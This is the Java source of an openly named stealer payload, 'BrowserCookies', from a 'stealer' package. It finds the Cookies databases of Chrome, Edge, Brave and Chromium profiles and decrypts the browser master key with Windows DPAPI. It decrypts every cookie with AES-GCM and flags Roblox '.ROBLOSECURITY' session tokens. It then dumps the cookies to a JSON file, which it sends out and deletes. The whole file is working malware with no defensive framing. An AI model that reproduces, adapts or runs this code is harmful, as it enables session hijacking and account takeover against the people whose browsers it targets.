package dev.chaarlottte.stealer.payload.impl;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.sun.jna.platform.win32.Crypt32Util;
import dev.chaarlottte.stealer.payload.Payload;
import dev.chaarlottte.stealer.util.PayloadDelivery;
import dev.chaarlottte.stealer.util.Utilities;
import org.json.JSONObject;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.sql.*;
import java.util.*;
import java.util.Date;

public class BrowserCookies implements Payload {
    private byte[] windowsMasterKey;

    File cookieStoreCopy = new File(".cookies.db");

    @Override
    public void execute() throws Exception {
        /*if (Utilities.isWindows()) {
            String pathLocalState = System.getProperty("user.home") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
            File localStateFile = new File(pathLocalState);

            ObjectMapper objectMapper = new ObjectMapper();
            JsonNode jsonNode = null;
            try {
                jsonNode = objectMapper.readTree(localStateFile);
            } catch (IOException e) {
                throw new IllegalStateException("Failed to load JSON from Chrome Local State file", e);
            }

            String encryptedMasterKeyWithPrefixB64 = jsonNode.at("/os_crypt/encrypted_key").asText();

            byte[] encryptedMasterKeyWithPrefix = Base64.getDecoder().decode(encryptedMasterKeyWithPrefixB64);
            byte[] encryptedMasterKey = Arrays.copyOfRange(encryptedMasterKeyWithPrefix, 5, encryptedMasterKeyWithPrefix.length);
            this.windowsMasterKey = Crypt32Util.cryptUnprotectData(encryptedMasterKey, 0);
        }*/

        HashSet<File> cookieStores = new HashSet<>();
        String userHome = System.getProperty("user.home");

        ArrayList<String> cookieDirs = new ArrayList<>();

        String[] paths = {
                "/AppData/Local/Google/Chrome/User Data/",
                "/Application Data/Google/Chrome/User Data",
                "/Library/Application Support/Google/Chrome",
                "/.config/chromium",
                "/AppData/Local/Microsoft/Edge/User Data",
                "/AppData/Local/Google/Chrome SxS/User Data",
                "/AppData/Local/Google/Chrome SxS/User Data",
                "/AppData/Local/BraveSoftware/Brave-Browser/User Data",
        };

        String[] profiles = {
                "Default",
                "Profile 1",
                "Profile 2",
                "Profile 3",
                "Profile 4",
                "Profile 5",
        };

        for(String path : paths) {
            for(String profile : profiles) {
                cookieDirs.add(path + "/" + profile);
            }
        }

        for (String cookieDirectory : cookieDirs) {
            String baseDir = userHome + cookieDirectory;
            List<String> files = new ArrayList<>();
            File filePath = new File(baseDir);
            if (filePath.exists() && filePath.isDirectory()) {
                for(File file : filePath.listFiles()) {
                    if(file.getName().equals("Cookies")) {
                        files.add(file.getPath());
                    }

                    if(file.isDirectory()) {
                        for(File file1 : file.listFiles()) {
                            if(file1.getName().equals("Cookies")) {
                                files.add(file1.getPath());
                            }

                            if(file1.isDirectory()) {
                                for(File file2 : file1.listFiles()) {
                                    if(file2.getName().equals("Cookies")) {
                                        files.add(file2.getPath());
                                    }
                                }
                            }
                        }
                    }
                }
            }
            if (files != null && files.size() > 0) {
                for (String file : files) {
                    cookieStores.add(new File(file));
                }
            }
        }

        List<DecryptedCookie> cookies = new ArrayList<>();

        for(File cookieStore : cookieStores) {
            if (cookieStore.exists()) {
                Connection connection = null;
                try {
                    setKeyAndStuffForPath(cookieStore.getAbsolutePath().split("User Data")[0] + "User Data\\");
                    cookieStoreCopy.delete();
                    Files.copy(cookieStore.toPath(), cookieStoreCopy.toPath());
                    Class.forName("org.sqlite.JDBC");
                    connection = DriverManager.getConnection("jdbc:sqlite:" + cookieStoreCopy.getAbsolutePath());
                    Statement statement = connection.createStatement();
                    statement.setQueryTimeout(30);
                    ResultSet result = statement.executeQuery("select * from cookies");
                    while (result.next()) {
                        byte[] encryptedBytes = result.getBytes("encrypted_value");
                        String path = result.getString("path");
                        String domain = result.getString("host_key");
                        Date expires = result.getDate("expires_utc");
                        String name = result.getString("name");

                        EncryptedCookie encryptedCookie = new EncryptedCookie(name, encryptedBytes, expires, path, domain);

                        DecryptedCookie decryptedCookie = decrypt(encryptedCookie);

                        if(decryptedCookie.getDecryptedValue().length() > 0) {
                            cookies.add(decryptedCookie);
                            if(name.contains(".ROBLOSECURITY")) {
                                RoblosecurityStealer.roblosecurities.add(decryptedCookie);
                            }
                        }
                        cookieStoreCopy.delete();
                    }
                } catch (Exception ignored) {} finally {
                    try {
                        if (connection != null) {
                            connection.close();
                        }
                    } catch (SQLException ignored) {}
                }
            }
        }

        JSONObject cookiesObject = new JSONObject();

        for(Cookie cookie : cookies) {
            JSONObject cookieObject = new JSONObject();
            cookieObject.put("website", cookie.getDomain());
            cookieObject.put("name", cookie.getName());
            cookieObject.put("value", cookie.getValue());
            cookiesObject.put("cookie-" + Utilities.getSaltString(5), cookieObject);
        }

        File file = new File("cookies-" + System.getProperty("user.name") + ".json");

        FileWriter writer = new FileWriter(file);
        writer.write(cookiesObject.toString(4));
        writer.flush();
        writer.close();

        System.out.println(cookiesObject.toString(4));

        PayloadDelivery.sendFileThenDelete(file);
        cookieStoreCopy.delete();
    }

    protected DecryptedCookie decrypt(EncryptedCookie encryptedCookie) {
        byte[] decryptedBytes = null;

        Utilities.fixCryptographyKeyLength();
        byte[] nonce = Arrays.copyOfRange(encryptedCookie.getEncryptedValue(), 3, 15);
        byte[] ciphertextTag = Arrays.copyOfRange(encryptedCookie.getEncryptedValue(), 15, encryptedCookie.getEncryptedValue().length);

        try {
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");

            GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(128, nonce);
            SecretKeySpec keySpec = new SecretKeySpec(windowsMasterKey, "AES");

            cipher.init(Cipher.DECRYPT_MODE, keySpec, gcmParameterSpec);
            decryptedBytes = cipher.doFinal(ciphertextTag);
        } catch (Exception e) {
            e.printStackTrace();
        }

        if (decryptedBytes == null) {
            return null;
        } else {
            return new DecryptedCookie(encryptedCookie.getName(), encryptedCookie.getEncryptedValue(), new String(decryptedBytes), encryptedCookie.getExpires(), encryptedCookie.getPath(), encryptedCookie.getDomain());
        }
    }

    private void setKeyAndStuffForPath(String path) {
        //String pathLocalState = System.getProperty("user.home") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
        String pathLocalState = path + "\\Local State";
        File localStateFile = new File(pathLocalState);

        ObjectMapper objectMapper = new ObjectMapper();
        JsonNode jsonNode = null;
        try {
            jsonNode = objectMapper.readTree(localStateFile);
        } catch (IOException e) {
            throw new IllegalStateException("Failed to load JSON from Chrome Local State file", e);
        }

        String encryptedMasterKeyWithPrefixB64 = jsonNode.at("/os_crypt/encrypted_key").asText();

        byte[] encryptedMasterKeyWithPrefix = Base64.getDecoder().decode(encryptedMasterKeyWithPrefixB64);
        byte[] encryptedMasterKey = Arrays.copyOfRange(encryptedMasterKeyWithPrefix, 5, encryptedMasterKeyWithPrefix.length);
        this.windowsMasterKey = Crypt32Util.cryptUnprotectData(encryptedMasterKey, 0);
    }

    class Cookie {

        protected String name;
        protected String value;
        protected Date expires;
        protected String path;
        protected String domain;

        public Cookie(String name, String value, Date expires, String path, String domain) {
            this.name = name;
            this.value = value;
            this.expires = expires;
            this.path = path;
            this.domain = domain;
        }

        public Cookie(String name, Date expires, String path, String domain) {
            this.name = name;
            this.expires = expires;
            this.path = path;
            this.domain = domain;
        }

        public String getName() {
            return name;
        }

        public String getValue() {
            return value;
        }

        public Date getExpires() {
            return expires;
        }

        public String getPath() {
            return path;
        }

        public String getDomain() {
            return domain;
        }

        @Override
        public String toString() {
            return "Cookie [name=" + name + ", value=" + value + "]";
        }
    }


    class EncryptedCookie extends Cookie {

        protected byte[] encryptedValue;

        public byte[] getEncryptedValue() {
            return encryptedValue;
        }

        public EncryptedCookie(String name, byte[] encryptedValue, Date expires, String path, String domain) {
            super(name, expires, path, domain);
            this.encryptedValue = encryptedValue;
            this.value = "(encrypted)";
        }

        public boolean isDecrypted() {
            return false;
        }

        @Override
        public String toString() {
            return "Cookie [name=" + name + " (encrypted)]";
        }

    }


    class DecryptedCookie extends EncryptedCookie {

        protected String decryptedValue;

        public DecryptedCookie(String name, byte[] encryptedValue, String decryptedValue, Date expires, String path, String domain) {
            super(name, encryptedValue, expires, path, domain);
            this.decryptedValue = decryptedValue;
            this.value = decryptedValue;
        }

        public String getDecryptedValue(){
            return decryptedValue;
        }

        @Override
        public boolean isDecrypted() {
            return true;
        }

        @Override
        public String toString() {
            return "Cookie [name=" + name + ", value=" + decryptedValue + "]";
        }

    }


}
